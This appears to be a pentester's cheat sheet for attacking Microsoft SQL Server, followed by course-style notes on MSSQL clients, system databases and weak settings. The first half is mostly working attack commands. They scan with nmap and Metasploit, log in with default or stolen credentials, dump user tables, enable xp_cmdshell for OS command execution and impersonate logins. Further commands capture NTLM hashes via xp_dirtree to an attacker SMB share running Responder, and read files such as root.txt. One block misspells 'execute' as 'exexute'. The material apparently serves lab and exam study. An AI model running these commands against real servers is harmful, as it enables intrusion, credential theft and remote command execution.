##### Scanning
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip

msfconsole
use auxiliary/scanner/mssql/mssql_ping

mssqlclient.py -p 1433 Administrator:password@$ip -windows-auth
mssqlclient.py -p 1433 domain.local/adot8:password@$ip 

netexec mssql 10.10.10.101 -d domain -u adot8 -p password -x "whoami"
```

##### Enumeration
```sql
select @@version;
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;
USE adot8;
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
SELECT name FROM <databaseName>..sysobjects WHERE xtype = 'U';    <-- find users table
select * from <databaseName>.dbo.users;
select * from <databaseName>.dbo.users where name like 'Admin%';
select * from <databaseName>..users;
```

##### Configure xp_cmdshell
```sql
sp_configure 'show advanced options', '1';
RECONFIGURE;
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
xp_cmdshell 'whoami';

exexute sp_configure 'show advanced options', '1';
RECONFIGURE;
exexute sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
exexute xp_cmdshell 'whoami;
```

##### Impersonate User
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

enum_impersonate
exec_as_user <grantor>
exec_as_login <grantor>
```

##### Capture Hash
```bash
sudo responder -I tun0
xp_dirtree \\10.10.14.3\adot8\
```

##### Read and copy file
```sql
select x from OpenRowset(BULK 'C:\Users\Administrator\root.txt',SINGLE_CLOB) R(x)

create table #errortable (ignore int)
bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\thatjusthappend.txt' )
```
[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET.
### MSSQL Clients
[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from.

**This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.**
![[Pasted image 20250103150154.png]]
### MSSQL Databases
|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|
### Default Configuration
When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
![[Pasted image 20250103150210.png]]Authentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment.
### Dangerous Settings
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account